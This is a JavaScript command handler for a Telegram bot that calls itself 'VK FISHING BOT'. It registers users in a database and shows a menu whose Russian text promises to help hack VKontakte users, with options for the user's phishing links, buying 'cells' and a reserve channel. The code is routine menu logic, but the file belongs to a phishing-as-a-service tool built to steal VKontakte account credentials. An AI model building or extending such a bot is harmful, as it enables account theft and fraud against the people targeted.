var database_worker = require("../../mysql/workers");

module.exports = {
	r: /^\/start$/i,
	f: function (msg, user_from_id, args, data) {
        database_worker.findUser(user_from_id, (user) => {
            if(user.length >= 1) {
                return data({
                    text: `<b>Добро пожаловать в VK FISHING BOT 🗽</b>\n<i>Я помогу тебе взломать пользователей ВКонтакте ✨</i>`,
                    keyboard: [
                        [{"text": `Мои ссылки 🌐`, callback_data: "link"}],
                        [{"text": `Приобрести ячейки 📂`, callback_data: "cells"}],
                        [{"text": "Другое 🦋", callback_data: "other"}],
                        [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]
                    ]
                });
            } else {
                var user_data = {
                    id_tg: user_from_id,
                    date_of_registration: Date.now(),
                    ref: 0,
                    name: msg.from.username ? `@${msg.from.username}` : `${msg.from.first_name}`  
                }

                database_worker.createUser(user_data, (data_user) => {
                    if(data_user == "true") {
                        return data({
                            text: `<b>Добро пожаловать в VK FISHING BOT 🗽</b>\n<i>Я помогу тебе взломать пользователей ВКонтакте ✨</i>`,
                            keyboard: [
                                [{"text": `Мои ссылки 🌐`, callback_data: "link"}],
                                [{"text": `Приобрести ячейки 📂`, callback_data: "cells"}],
                                [{"text": "Другое 🦋", callback_data: "other"}],
                                [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]
                            ]
                        });
                    }
                })
            }
        });
	},
	desc: "",
	rights: 0,
	type: "all"
}